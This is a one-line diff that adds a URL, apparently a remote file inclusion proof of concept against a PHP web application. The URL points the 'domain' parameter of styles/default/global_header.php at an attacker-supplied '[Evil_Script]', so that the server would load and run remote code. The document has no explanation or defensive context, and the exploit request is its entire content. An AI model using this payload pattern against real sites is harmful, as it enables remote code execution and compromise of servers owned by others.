@@ -1,0 +1,1 @@
+http://www.example.com/[path]/styles/default/global_header.php?installed=23&domain=[Evil_Script]
